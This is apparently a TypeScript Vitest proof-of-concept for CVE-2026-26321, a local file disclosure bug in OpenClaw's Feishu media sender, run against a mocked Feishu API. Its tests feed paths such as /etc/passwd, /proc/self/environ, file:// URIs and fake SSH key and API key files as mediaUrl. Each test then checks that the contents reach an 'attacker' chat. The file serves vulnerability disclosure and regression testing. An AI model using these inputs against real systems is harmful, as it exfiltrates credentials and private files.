/**
 * CVE-2026-26321 — Proof-of-Concept Exploit
 *
 * OpenClaw < 2026.2.14 — Path Traversal / Local File Disclosure via Feishu Extension
 *
 * Demonstrates that sendMediaFeishu() reads arbitrary local files from disk when the
 * attacker-controlled `mediaUrl` parameter is set to a local filesystem path. The file
 * contents are then uploaded to the Feishu API (here mocked), proving full exfiltration.
 *
 * Attack Vectors Tested:
 *   1. Absolute Unix path (/etc/passwd)
 *   2. Sentinel file read (/tmp/cve-secret.txt)
 *   3. file:// protocol (file:///tmp/cve-secret.txt)
 *   4. Tilde expansion (~/.bashrc or similar)
 *   5. Invalid URL strings (fallthrough to local read)
 *
 * Root Cause: isLocalPath() in media.ts classifies filesystem paths and then
 *   sendMediaFeishu() reads them with fs.readFileSync() with no sandboxing.
 */
import { beforeEach, describe, expect, it, vi } from "vitest";
import fs from "fs";

// ─── Mock Setup (same pattern as existing media.test.ts) ──────────────────────

const createFeishuClientMock = vi.hoisted(() => vi.fn());
const resolveFeishuAccountMock = vi.hoisted(() => vi.fn());
const normalizeFeishuTargetMock = vi.hoisted(() => vi.fn());
const resolveReceiveIdTypeMock = vi.hoisted(() => vi.fn());

const imageCreateMock = vi.hoisted(() => vi.fn());
const fileCreateMock = vi.hoisted(() => vi.fn());
const messageCreateMock = vi.hoisted(() => vi.fn());

vi.mock("./client.js", () => ({
  createFeishuClient: createFeishuClientMock,
}));

vi.mock("./accounts.js", () => ({
  resolveFeishuAccount: resolveFeishuAccountMock,
}));

vi.mock("./targets.js", () => ({
  normalizeFeishuTarget: normalizeFeishuTargetMock,
  resolveReceiveIdType: resolveReceiveIdTypeMock,
}));

import { sendMediaFeishu } from "./media.js";

// ─── Test Suite ───────────────────────────────────────────────────────────────

describe("CVE-2026-26321: Local File Disclosure via sendMediaFeishu()", () => {
  /** Captures the Buffer that was uploaded to the mock Feishu API */
  let uploadedBuffer: Buffer | null = null;
  let uploadedFileName: string | null = null;

  beforeEach(() => {
    vi.clearAllMocks();
    uploadedBuffer = null;
    uploadedFileName = null;

    // Mock Feishu account resolution
    resolveFeishuAccountMock.mockReturnValue({
      configured: true,
      accountId: "main",
      appId: "cli_test_app_id",
      appSecret: "test_app_secret",
      domain: "feishu",
    });

    // Mock target normalization
    normalizeFeishuTargetMock.mockReturnValue("ou_attacker");
    resolveReceiveIdTypeMock.mockReturnValue("open_id");

    // Mock Feishu client — capture the uploaded file buffer
    createFeishuClientMock.mockReturnValue({
      im: {
        image: {
          create: imageCreateMock.mockImplementation(async (req: any) => {
            // Capture image buffer if it's an image upload
            if (Buffer.isBuffer(req?.data?.image)) {
              uploadedBuffer = req.data.image;
            }
            return { code: 0, image_key: "img_exfiltrated_key" };
          }),
        },
        file: {
          create: fileCreateMock.mockImplementation(async (req: any) => {
            // Capture file buffer
            if (Buffer.isBuffer(req?.data?.file)) {
              uploadedBuffer = req.data.file;
              uploadedFileName = req.data.file_name;
            }
            return { code: 0, data: { file_key: "file_exfiltrated_key" } };
          }),
        },
        message: {
          create: messageCreateMock.mockResolvedValue({
            code: 0,
            data: { message_id: "msg_exfiltrated" },
          }),
        },
      },
    });
  });

  // ── Vector 1: Absolute Unix path ──────────────────────────────────────────

  it("EXPLOIT: reads /etc/passwd via absolute path", async () => {
    console.log("\n[CVE-2026-26321] Vector 1: Absolute path /etc/passwd");

    await sendMediaFeishu({
      cfg: {} as any,
      to: "user:ou_attacker",
      mediaUrl: "/etc/passwd",
    });

    // The file was uploaded to the mock Feishu API
    expect(fileCreateMock).toHaveBeenCalled();
    expect(uploadedBuffer).not.toBeNull();

    const content = uploadedBuffer!.toString("utf-8");
    console.log(`  [EXFILTRATED] /etc/passwd (${uploadedBuffer!.length} bytes):`);
    console.log(`  ${content.split("\n").slice(0, 3).join("\n  ")}`);
    console.log(`  ...`);

    // Verify we got real /etc/passwd content
    expect(content).toContain("root:");
    expect(content).toContain("/bin/");

    console.log("  [CONFIRMED] Arbitrary file read via absolute path\n");
  });

  // ── Vector 2: Sentinel file (proves arbitrary file read) ──────────────────

  it("EXPLOIT: reads sentinel file /tmp/cve-secret.txt", async () => {
    console.log("\n[CVE-2026-26321] Vector 2: Sentinel file /tmp/cve-secret.txt");

    await sendMediaFeishu({
      cfg: {} as any,
      to: "user:ou_attacker",
      mediaUrl: "/tmp/cve-secret.txt",
    });

    expect(fileCreateMock).toHaveBeenCalled();
    expect(uploadedBuffer).not.toBeNull();

    const content = uploadedBuffer!.toString("utf-8").trim();
    console.log(`  [EXFILTRATED] /tmp/cve-secret.txt: "${content}"`);

    // Verify the exact sentinel content (trim trailing newline from file)
    expect(content).toBe("CVE-2026-26321-SECRET-DATA-EXFILTRATED");

    console.log("  [CONFIRMED] Secret data exfiltrated via sendMediaFeishu()\n");
  });

  // ── Vector 3: file:// protocol ────────────────────────────────────────────

  it("EXPLOIT: reads file via file:// protocol URI", async () => {
    console.log("\n[CVE-2026-26321] Vector 3: file:// protocol");

    await sendMediaFeishu({
      cfg: {} as any,
      to: "user:ou_attacker",
      mediaUrl: "file:///tmp/cve-secret.txt",
    });

    expect(fileCreateMock).toHaveBeenCalled();
    expect(uploadedBuffer).not.toBeNull();

    const content = uploadedBuffer!.toString("utf-8").trim();
    console.log(`  [EXFILTRATED] file:///tmp/cve-secret.txt: "${content}"`);

    expect(content).toBe("CVE-2026-26321-SECRET-DATA-EXFILTRATED");

    console.log("  [CONFIRMED] file:// protocol bypasses URL validation\n");
  });

  // ── Vector 4: Simulated credential exfiltration ───────────────────────────

  it("EXPLOIT: exfiltrates simulated API credentials", async () => {
    console.log("\n[CVE-2026-26321] Vector 4: Credential exfiltration");

    await sendMediaFeishu({
      cfg: {} as any,
      to: "user:ou_attacker",
      mediaUrl: "/tmp/fake-env",
    });

    expect(fileCreateMock).toHaveBeenCalled();
    expect(uploadedBuffer).not.toBeNull();

    const content = uploadedBuffer!.toString("utf-8");
    console.log(`  [EXFILTRATED] /tmp/fake-env: "${content}"`);

    expect(content).toContain("OPENCLAW_API_KEY=sk-secret-key-12345");

    console.log("  [CONFIRMED] API credentials exfiltrated\n");
  });

  // ── Vector 5: Simulated SSH key exfiltration ──────────────────────────────

  it("EXPLOIT: exfiltrates simulated SSH private key", async () => {
    console.log("\n[CVE-2026-26321] Vector 5: SSH key exfiltration");

    await sendMediaFeishu({
      cfg: {} as any,
      to: "user:ou_attacker",
      mediaUrl: "/tmp/fake-ssh-key",
    });

    expect(fileCreateMock).toHaveBeenCalled();
    expect(uploadedBuffer).not.toBeNull();

    const content = uploadedBuffer!.toString("utf-8");
    console.log(`  [EXFILTRATED] /tmp/fake-ssh-key (${uploadedBuffer!.length} bytes):`);
    console.log(`  ${content.substring(0, 80)}...`);

    expect(content).toContain("BEGIN");

    console.log("  [CONFIRMED] SSH private key exfiltrated\n");
  });

  // ── Vector 6: Invalid URL falls through to local path ─────────────────────

  it("EXPLOIT: invalid URL string treated as local path (isLocalPath fallthrough)", async () => {
    console.log("\n[CVE-2026-26321] Vector 6: Invalid URL fallthrough");

    // Create a test file with a name that looks like a URL but isn't valid
    const testPath = "/tmp/cve-test-fallthrough";
    fs.writeFileSync(testPath, "FALLTHROUGH-EXFIL-DATA");

    try {
      await sendMediaFeishu({
        cfg: {} as any,
        to: "user:ou_attacker",
        mediaUrl: testPath,
      });

      expect(fileCreateMock).toHaveBeenCalled();
      expect(uploadedBuffer).not.toBeNull();

      const content = uploadedBuffer!.toString("utf-8");
      console.log(`  [EXFILTRATED] ${testPath}: "${content}"`);

      expect(content).toBe("FALLTHROUGH-EXFIL-DATA");
      console.log("  [CONFIRMED] Invalid URL falls through to local file read\n");
    } finally {
      fs.unlinkSync(testPath);
    }
  });

  // ── Vector 7: Verify the file content reaches the Feishu message API ──────

  it("EXPLOIT: full chain — file read → upload → message send", async () => {
    console.log("\n[CVE-2026-26321] Vector 7: Full exfiltration chain verification");

    await sendMediaFeishu({
      cfg: {} as any,
      to: "user:ou_attacker",
      mediaUrl: "/tmp/cve-secret.txt",
    });

    // Verify the complete chain: file read → file upload → message create
    // Step 1: File was uploaded to Feishu
    expect(fileCreateMock).toHaveBeenCalledTimes(1);
    const uploadCall = fileCreateMock.mock.calls[0][0];
    expect(Buffer.isBuffer(uploadCall.data.file)).toBe(true);
    expect(uploadCall.data.file.toString("utf-8").trim()).toBe(
      "CVE-2026-26321-SECRET-DATA-EXFILTRATED",
    );
    console.log("  [STEP 1] File read from disk and uploaded to Feishu API ✓");

    // Step 2: Message was created with the file key
    expect(messageCreateMock).toHaveBeenCalledTimes(1);
    const msgCall = messageCreateMock.mock.calls[0][0];
    const msgContent = JSON.parse(msgCall.data.content);
    expect(msgContent.file_key).toBe("file_exfiltrated_key");
    console.log("  [STEP 2] Message sent to attacker chat with exfiltrated file ✓");

    // Step 3: Message was sent to the attacker's chat
    expect(msgCall.data.receive_id).toBe("ou_attacker");
    expect(msgCall.params.receive_id_type).toBe("open_id");
    console.log("  [STEP 3] Attacker receives file in Feishu chat (ou_attacker) ✓");

    console.log("  [CONFIRMED] Full exfiltration chain: disk → Feishu API → attacker chat\n");
  });
});

describe("CVE-2026-26321: isLocalPath() classification audit", () => {
  // This test imports the vulnerable isLocalPath() indirectly by testing
  // what happens with various input patterns. Since isLocalPath is not exported,
  // we verify its behavior through sendMediaFeishu's file read behavior.

  const testCases = [
    { input: "/etc/hostname", desc: "Unix absolute path", expectLocal: true },
    { input: "/proc/self/environ", desc: "Proc filesystem", expectLocal: true },
    { input: "/tmp/cve-secret.txt", desc: "Temp file", expectLocal: true },
    { input: "file:///etc/passwd", desc: "file:// protocol", expectLocal: true },
    { input: "relative-path", desc: "Relative path (fails URL parse)", expectLocal: true },
  ];

  for (const tc of testCases) {
    if (tc.expectLocal) {
      it(`classifies "${tc.input}" as local path (${tc.desc})`, async () => {
        // If isLocalPath returns true AND the file exists, sendMediaFeishu will read it
        // We test with /tmp/cve-secret.txt which we know exists
        // For paths that don't exist, sendMediaFeishu throws "Local file not found"
        try {
          await sendMediaFeishu({
            cfg: {} as any,
            to: "user:ou_attacker",
            mediaUrl: tc.input,
          });
          // If it succeeds, the file was read (confirming local path classification)
          console.log(`  ✓ "${tc.input}" → local path → file read attempted`);
        } catch (err: any) {
          if (err.message?.includes("Local file not found")) {
            // isLocalPath returned true, but the file doesn't exist
            // This STILL confirms the path traversal — the code tried to read from disk
            console.log(`  ✓ "${tc.input}" → local path → fs.readFileSync attempted (file not found)`);
            expect(err.message).toContain("Local file not found");
          } else {
            throw err;
          }
        }
      });
    }
  }
});
